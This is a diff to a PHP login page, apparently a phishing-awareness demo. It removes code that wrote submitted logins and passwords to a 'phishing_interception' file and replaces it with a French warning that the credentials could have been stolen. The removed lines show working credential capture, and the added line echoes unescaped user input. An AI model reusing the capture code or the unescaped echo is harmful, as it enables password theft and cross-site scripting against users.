@@ -59,15 +59,12 @@
 </form>
 
 <?php 
+
 $login=$_POST['login'];
 $pass=$_POST['password'];
 
 if(isset($login) && isset($pass)){
-echo 'ok';
-$phising = fopen('phishing_interception.txt', 'a+');
-fwrite($phising,"$login - $pass\r\n"); 
-fclose($phising);
-
+	echo "Exemple de phishing, vos identifiants $login et $pass auraient pu être volés";
 }
 ?>    
 </div>
